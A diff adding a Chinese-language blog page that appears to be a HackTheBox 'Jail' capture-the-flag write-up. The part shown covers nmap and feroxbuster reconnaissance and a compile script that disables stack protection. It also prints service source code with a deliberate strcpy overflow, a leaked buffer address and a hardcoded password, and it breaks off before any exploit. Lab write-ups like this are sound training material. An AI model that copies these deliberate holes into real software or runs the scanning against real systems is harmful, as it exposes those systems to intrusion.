@@ -1,0 +1,833 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+	<link rel="bookmark"  type="image/x-icon"  href="/img/logo_miccall.png"/>
+	<link rel="shortcut icon" href="/img/logo_miccall.png">
+	
+			    <title>
+    kaia
+    </title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="/css/mic_main.css" />
+    <link rel="stylesheet" href="/css/dropdownMenu.css" />
+    <meta name="keywords" content="kaia" />
+    
+    	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	 
+    <noscript>
+        <link rel="stylesheet" href="/css/noscript.css" />
+    </noscript>
+    <style type="text/css">
+        body:before {
+          content: ' ';
+          position: fixed;
+          top: 0;
+          background: url('/img/bg.jpg') center 0 no-repeat;
+          right: 0;
+          bottom: 0;
+          left: 0;
+          background-size: cover; 
+        }
+    </style>
+
+			    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script async type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jquery.scrollex.min.js"></script>
+    <script src="/js/jquery.scrolly.min.js"></script>
+    <script src="/js/skel.min.js"></script>
+    <script src="/js/util.js"></script>
+    <script src="/js/main.js"></script>
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+    
+		
+<!-- Layouts -->
+
+
+
+<!--  代码渲染  -->
+<link rel="stylesheet" href="/css/prism_coy.css" />
+<link rel="stylesheet" href="/css/typo.css" />
+<!-- 文章页 -->
+<body class="is-loading">
+    <!-- Wrapper 外包 s-->
+    <div id="wrapper" class="fade-in">
+        <!-- Intro 头部显示 s -->
+        <!-- Intro 头部显示 e -->
+        <!-- Header 头部logo start -->
+        <header id="header">
+    <a href="/" class="logo">Kaia</a>
+</header>
+        <!-- Nav 导航条 start -->
+        <nav id="nav" class="special" >
+            <ul class="menu links" >
+			<!-- Homepage  主页  --> 
+			<li >
+	            <a href="/" rel="nofollow">主页</a>
+	        </li>
+			<!-- categories_name  分类   --> 
+	        
+	        <li class="active">
+	            <a href="#s1">分类</a>
+	                    <ul class="submenu">
+	                        <li>
+	                        <a class="category-link" href="/categories/binary-security/">binary security</a></li><li><a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+	                    </ul>
+	        </li>
+	        
+	        <!-- archives  归档   --> 
+	        
+	        
+		        <!-- Pages 自定义   -->
+		        
+		        <li>
+		            <a href="/gallery/" title="图库">
+		                图库
+		            </a>
+		        </li>
+		        
+		        <li>
+		            <a href="/tag/" title="标签">
+		                标签
+		            </a>
+		        </li>
+		        
+
+
+            </ul>
+            <!-- icons 图标   -->
+			<ul class="icons">
+                    
+                    <li>
+                        <a title="github" href="https://github.com/puzzz" target="_blank" rel="noopener">
+                            <i class="icon fa fa-github"></i>
+                        </a>
+                    </li>
+                    
+			</ul>
+</nav>
+
+        <div id="main" >
+            <div class ="post_page_title_img" style="height: 25rem;background-image: url(/gallery/thumbnail/htb_socialmedia_cover.png);background-position: center; background-repeat:no-repeat; background-size:cover;-moz-background-size:cover;overflow:hidden;" >
+                <a href="#" style="padding: 4rem 4rem 2rem 4rem ;"><h2 >Jail</h2></a>
+            </div>
+            <!-- Post -->
+            <div class="typo" style="padding: 3rem;">
+                <h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><p><a href="#nmap%E6%89%AB%E6%8F%8F">nmap扫描</a></p>
+<ul>
+<li><a href="#%E6%89%AB%E6%8F%8Fweb%E8%B7%AF%E5%BE%84">扫描web路径</a></li>
+</ul>
+</li>
+<li><p><a href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90">代码分析：</a></p>
+</li>
+<li><p><a href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%85%B3%E9%94%AE%E7%82%B9">漏洞的关键点</a></p>
+<ul>
+<li><a href="#ida%E8%B0%83%E8%AF%95">IDA调试</a></li>
+</ul>
+</li>
+<li><p><a href="#%E8%8E%B7%E5%8F%96nobody-shell">获取nobody shell</a></p>
+</li>
+<li><p><a href="#pkexec%E6%8F%90%E6%9D%83%E4%B8%80%E6%AD%A5%E5%88%B0%E4%BD%8D%E9%9D%9E%E9%A2%84%E6%9C%9F%E8%A7%A3">pkexec提权一步到位(非预期解)</a></p>
+</li>
+<li><p><a href="#%E6%AD%A3%E5%B8%B8%E6%8F%90%E6%9D%83">正常提权</a></p>
+<ul>
+<li><a href="#nobody%E6%8F%90%E6%9D%83%E5%88%B0frank">nobody提权到frank</a></li>
+<li><a href="#%E4%BC%AA%E9%80%A0frank%E7%94%A8%E6%88%B7-%E8%AE%BF%E9%97%AEnfs">伪造frank用户 访问nfs</a></li>
+<li><a href="#frank%E6%8F%90%E6%9D%83%E5%88%B0adm">frank提权到adm</a></li>
+<li><a href="#adm%E6%8F%90%E6%9D%83%E5%88%B0root">adm提权到root</a></li>
+<li><a href="#%E4%B8%8B%E9%9D%A2%E7%9A%84%E6%89%AF%E6%B7%A1%E7%9A%84%E7%A4%BE%E5%B7%A5%E8%A7%A3%E5%AF%86%E6%97%B6%E9%97%B4">下面的扯淡的社工解密时间</a></li>
+<li><a href="#%E6%81%A2%E5%A4%8Droot%E5%85%AC%E9%92%A5">恢复root公钥</a></li>
+</ul>
+</li>
+</ul>
+<h1 id="Jail"><a href="#Jail" class="headerlink" title="Jail"></a>Jail</h1><h3 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h3><pre class="line-numbers language-bash"><code class="language-bash">nmap -A 10.10.10.34
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash"><code class="language-bash">Starting Nmap 7.92 <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at 2022-07-28 22:27 EDT
+Stats: 0:02:01 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 48.94% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 22:32 <span class="token punctuation">(</span>0:02:04 remaining<span class="token punctuation">)</span>
+Stats: 0:05:59 elapsed<span class="token punctuation">;</span> 0 hosts completed <span class="token punctuation">(</span>1 up<span class="token punctuation">)</span>, 1 undergoing Service Scan
+Service scan Timing: About 83.33% <span class="token keyword">done</span><span class="token punctuation">;</span> ETC: 22:34 <span class="token punctuation">(</span>0:00:16 remaining<span class="token punctuation">)</span>
+Nmap scan report <span class="token keyword">for</span> 10.10.10.34
+Host is up <span class="token punctuation">(</span>0.12s latency<span class="token punctuation">)</span>.
+Not shown: 65257 filtered tcp ports <span class="token punctuation">(</span>no-response<span class="token punctuation">)</span>, 272 filtered tcp ports <span class="token punctuation">(</span>host-prohibited<span class="token punctuation">)</span>
+PORT      STATE SERVICE    VERSION
+22/tcp    <span class="token function">open</span>  <span class="token function">ssh</span>        OpenSSH 6.6.1 <span class="token punctuation">(</span>protocol 2.0<span class="token punctuation">)</span>
+<span class="token operator">|</span> ssh-hostkey:
+<span class="token operator">|</span>   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
+<span class="token operator">|</span>_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
+80/tcp    <span class="token function">open</span>  http       Apache httpd 2.4.6 <span class="token variable"><span class="token punctuation">((</span>CentOS<span class="token punctuation">))</span></span>
+<span class="token operator">|</span> http-methods:
+<span class="token operator">|</span>_  Potentially risky methods: TRACE
+<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> charset<span class="token operator">=</span>UTF-8<span class="token punctuation">)</span>.
+<span class="token operator">|</span>_http-server-header: Apache/2.4.6 <span class="token punctuation">(</span>CentOS<span class="token punctuation">)</span>
+111/tcp   <span class="token function">open</span>  rpcbind    2-4 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100000)</span>
+<span class="token operator">|</span> rpcinfo:
+<span class="token operator">|</span>   program version    port/proto  <span class="token function">service</span>
+<span class="token operator">|</span>   100000  2,3,4        111/tcp   rpcbind
+<span class="token operator">|</span>   100000  2,3,4        111/udp   rpcbind
+<span class="token operator">|</span>   100000  3,4          111/tcp6  rpcbind
+<span class="token operator">|</span>   100000  3,4          111/udp6  rpcbind
+<span class="token operator">|</span>   100003  3,4         2049/tcp   nfs
+<span class="token operator">|</span>   100003  3,4         2049/tcp6  nfs
+<span class="token operator">|</span>   100003  3,4         2049/udp   nfs
+<span class="token operator">|</span>   100003  3,4         2049/udp6  nfs
+<span class="token operator">|</span>   100005  1,2,3      20048/tcp   mountd
+<span class="token operator">|</span>   100005  1,2,3      20048/tcp6  mountd
+<span class="token operator">|</span>   100005  1,2,3      20048/udp   mountd
+<span class="token operator">|</span>   100005  1,2,3      20048/udp6  mountd
+<span class="token operator">|</span>   100021  1,3,4      39526/tcp6  nlockmgr
+<span class="token operator">|</span>   100021  1,3,4      42846/udp6  nlockmgr
+<span class="token operator">|</span>   100021  1,3,4      46781/tcp   nlockmgr
+<span class="token operator">|</span>   100021  1,3,4      49806/udp   nlockmgr
+<span class="token operator">|</span>   100024  1          33052/udp   status
+<span class="token operator">|</span>   100024  1          34561/tcp   status
+<span class="token operator">|</span>   100024  1          49568/tcp6  status
+<span class="token operator">|</span>   100024  1          56922/udp6  status
+<span class="token operator">|</span>   100227  3           2049/tcp   nfs_acl
+<span class="token operator">|</span>   100227  3           2049/tcp6  nfs_acl
+<span class="token operator">|</span>   100227  3           2049/udp   nfs_acl
+<span class="token operator">|</span>_  100227  3           2049/udp6  nfs_acl
+2049/tcp  <span class="token function">open</span>  nfs_acl    3 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100227)</span>
+7411/tcp  <span class="token function">open</span>  daqstream?
+<span class="token operator">|</span> fingerprint-strings:
+<span class="token operator">|</span>   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
+<span class="token operator">|</span>_    OK Ready. Send USER command.
+20048/tcp <span class="token function">open</span>  mountd     1-3 <span class="token punctuation">(</span>RPC <span class="token comment" spellcheck="true">#100005)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>发现以下端口信息：</p>
+<pre class="line-numbers language-bash"><code class="language-bash">22端口 <span class="token function">ssh</span> OpenSSH 6.6.1
+
+80端口 http  Apache httpd 2.4.6 <span class="token variable"><span class="token punctuation">((</span>CentOS<span class="token punctuation">))</span></span>
+
+111端口  rpcbind
+
+2049 nfs_acl
+
+7411  未知服务
+
+20048 mountd  nfs挂载守护进程
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>访问80端口，返回一个有意思的图片，没什么信息。</p>
+<p><img src="/2022/08/22/Jail/image/image_G3SUaFJqLQ.png"></p>
+<h4 id="扫描web路径"><a href="#扫描web路径" class="headerlink" title="扫描web路径"></a>扫描web路径</h4><pre class="line-numbers language-bash"><code class="language-bash">feroxbuster -u http://10.10.10.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/2022/08/22/Jail/image/image_ugAOAMOR2N.png"></p>
+<p>发现目录 <a target="_blank" rel="noopener" href="http://10.10.10.34/jailuser%EF%BC%8C">http://10.10.10.34/jailuser，</a></p>
+<p><img src="/2022/08/22/Jail/image/image_8MwU7mh8bA.png"></p>
+<p>compile.sh</p>
+<pre class="line-numbers language-bash"><code class="language-bash">gcc -o jail jail.c -m32 -z execstack
+<span class="token function">service</span> jail stop
+<span class="token function">cp</span> jail /usr/local/bin/jail
+<span class="token function">service</span> jail start
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>但是<code>-z execstack</code> 禁用了数据区执行保护 (DEP)，也就是说如果jail.c的逻辑存在溢出问题，可以执行恶意指令。</p>
+<p>那目标明确，接下来重点分析jail的源代码</p>
+<p>jail.c</p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#include &lt;stdio.h></span>
+<span class="token comment" spellcheck="true">#include &lt;stdlib.h></span>
+<span class="token comment" spellcheck="true">#include &lt;netdb.h></span>
+<span class="token comment" spellcheck="true">#include &lt;netinet/in.h></span>
+<span class="token comment" spellcheck="true">#include &lt;string.h></span>
+<span class="token comment" spellcheck="true">#include &lt;unistd.h></span>
+<span class="token comment" spellcheck="true">#include &lt;time.h></span>
+
+int debugmode<span class="token punctuation">;</span>
+int handle<span class="token punctuation">(</span>int sock<span class="token punctuation">)</span><span class="token punctuation">;</span>
+int auth<span class="token punctuation">(</span>char *username, char *password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+int auth<span class="token punctuation">(</span>char *username, char *password<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    char userpass<span class="token punctuation">[</span>16<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    char *response<span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>debugmode <span class="token operator">==</span> 1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        printf<span class="token punctuation">(</span><span class="token string">"Debug: userpass buffer @ %p\n"</span>, userpass<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>strcmp<span class="token punctuation">(</span>username, <span class="token string">"admin"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> 0<span class="token punctuation">)</span> <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
+    strcpy<span class="token punctuation">(</span>userpass, password<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>strcmp<span class="token punctuation">(</span>userpass, <span class="token string">"1974jailbreak!"</span><span class="token punctuation">)</span> <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        <span class="token keyword">return</span> 1<span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
+        printf<span class="token punctuation">(</span><span class="token string">"Incorrect username and/or password.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+
+int handle<span class="token punctuation">(</span>int sock<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    int n<span class="token punctuation">;</span>
+    int gotuser <span class="token operator">=</span> 0<span class="token punctuation">;</span>
+    int gotpass <span class="token operator">=</span> 0<span class="token punctuation">;</span>
+    char buffer<span class="token punctuation">[</span>1024<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    char strchr<span class="token punctuation">[</span>2<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\n\x00"</span><span class="token punctuation">;</span>
+    char *token<span class="token punctuation">;</span>
+    char username<span class="token punctuation">[</span>256<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    char password<span class="token punctuation">[</span>256<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    debugmode <span class="token operator">=</span> 0<span class="token punctuation">;</span>
+    memset<span class="token punctuation">(</span>buffer, 0, 256<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    dup2<span class="token punctuation">(</span>sock, STDOUT_FILENO<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    dup2<span class="token punctuation">(</span>sock, STDERR_FILENO<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    printf<span class="token punctuation">(</span><span class="token string">"OK Ready. Send USER command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    while<span class="token punctuation">(</span>1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        n <span class="token operator">=</span> read<span class="token punctuation">(</span>sock, buffer, 1024<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            perror<span class="token punctuation">(</span><span class="token string">"ERROR reading from socket"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        token <span class="token operator">=</span> strtok<span class="token punctuation">(</span>buffer, strchr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">while</span> <span class="token punctuation">(</span>token <span class="token operator">!=</span> NULL<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>gotuser <span class="token operator">==</span> 1 <span class="token operator">&amp;&amp;</span> gotpass <span class="token operator">==</span> 1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+                <span class="token keyword">break</span><span class="token punctuation">;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+            <span class="token keyword">if</span> <span class="token punctuation">(</span>strncmp<span class="token punctuation">(</span>token, <span class="token string">"USER "</span>, 5<span class="token punctuation">)</span> <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+                strncpy<span class="token punctuation">(</span>username, token+5, sizeof<span class="token punctuation">(</span>username<span class="token punctuation">))</span><span class="token punctuation">;</span>
+                gotuser<span class="token operator">=</span>1<span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>gotpass <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+                    printf<span class="token punctuation">(</span><span class="token string">"OK Send PASS command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else if (strncmp(token, "PASS ", 5) == 0) &amp;#123;</span>
+                strncpy<span class="token punctuation">(</span>password, token+5, sizeof<span class="token punctuation">(</span>password<span class="token punctuation">))</span><span class="token punctuation">;</span>
+                gotpass<span class="token operator">=</span>1<span class="token punctuation">;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>gotuser <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+                    printf<span class="token punctuation">(</span><span class="token string">"OK Send USER command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else if (strncmp(token, "DEBUG", 5) == 0) &amp;#123;</span>
+                <span class="token keyword">if</span> <span class="token punctuation">(</span>debugmode <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+                    debugmode <span class="token operator">=</span> 1<span class="token punctuation">;</span>
+                    printf<span class="token punctuation">(</span><span class="token string">"OK DEBUG mode on.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else if (debugmode == 1) &amp;#123;</span>
+                    debugmode <span class="token operator">=</span> 0<span class="token punctuation">;</span>
+                    printf<span class="token punctuation">(</span><span class="token string">"OK DEBUG mode off.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+                    fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+                <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+            <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+            token <span class="token operator">=</span> strtok<span class="token punctuation">(</span>NULL, strchr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>gotuser <span class="token operator">==</span> 1 <span class="token operator">&amp;&amp;</span> gotpass <span class="token operator">==</span> 1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            <span class="token keyword">break</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>auth<span class="token punctuation">(</span>username, password<span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        printf<span class="token punctuation">(</span><span class="token string">"OK Authentication success. Send command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        n <span class="token operator">=</span> read<span class="token punctuation">(</span>sock, buffer, 1024<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            perror<span class="token punctuation">(</span><span class="token string">"Socket read error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span>strncmp<span class="token punctuation">(</span>buffer, <span class="token string">"OPEN"</span>, 4<span class="token punctuation">)</span> <span class="token operator">==</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+            printf<span class="token punctuation">(</span><span class="token string">"OK Jail doors opened."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else if (strncmp(buffer, "CLOSE", 5) == 0) &amp;#123;</span>
+            printf<span class="token punctuation">(</span><span class="token string">"OK Jail doors closed."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
+            printf<span class="token punctuation">(</span><span class="token string">"ERR Invalid command.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> 1<span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125; else &amp;#123;</span>
+        printf<span class="token punctuation">(</span><span class="token string">"ERR Authentication failed.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        fflush<span class="token punctuation">(</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token keyword">return</span> 0<span class="token punctuation">;</span>
+<span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+
+int main<span class="token punctuation">(</span>int argc, char *argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+    int sockfd<span class="token punctuation">;</span>
+    int newsockfd<span class="token punctuation">;</span>
+    int port<span class="token punctuation">;</span>
+    int clientlen<span class="token punctuation">;</span>
+    char buffer<span class="token punctuation">[</span>256<span class="token punctuation">]</span><span class="token punctuation">;</span>
+    struct sockaddr_in server_addr<span class="token punctuation">;</span>
+    struct sockaddr_in client_addr<span class="token punctuation">;</span>
+    int n<span class="token punctuation">;</span>
+    int pid<span class="token punctuation">;</span>
+    int sockyes<span class="token punctuation">;</span>
+    sockyes <span class="token operator">=</span> 1<span class="token punctuation">;</span>
+    sockfd <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET, SOCK_STREAM, 0<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>sockfd <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        perror<span class="token punctuation">(</span><span class="token string">"Socket error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>setsockopt<span class="token punctuation">(</span>sockfd, SOL_SOCKET, SO_REUSEADDR, <span class="token operator">&amp;</span>sockyes, sizeof<span class="token punctuation">(</span>int<span class="token punctuation">))</span> <span class="token operator">==</span> -1<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        perror<span class="token punctuation">(</span><span class="token string">"Setsockopt error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        exit<span class="token punctuation">(</span>1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span>
+    memset<span class="token variable"><span class="token punctuation">((</span>char<span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>server_addr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sizeof<span class="token punctuation">(</span>server_addr<span class="token punctuation">))</span></span><span class="token punctuation">;</span>
+    port <span class="token operator">=</span> 7411<span class="token punctuation">;</span>
+    server_addr.sin_family <span class="token operator">=</span> AF_INET<span class="token punctuation">;</span>
+    server_addr.sin_addr.s_addr <span class="token operator">=</span> INADDR_ANY<span class="token punctuation">;</span>
+    server_addr.sin_port <span class="token operator">=</span> htons<span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>bind<span class="token punctuation">(</span>sockfd, <span class="token punctuation">(</span>struct sockaddr*<span class="token punctuation">)</span><span class="token operator">&amp;</span>server_addr, sizeof<span class="token punctuation">(</span>server_addr<span class="token punctuation">))</span> <span class="token operator">&lt;</span> 0<span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>
+        perror<span class="token punctuation">(</span><span class="token string">"Bind error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
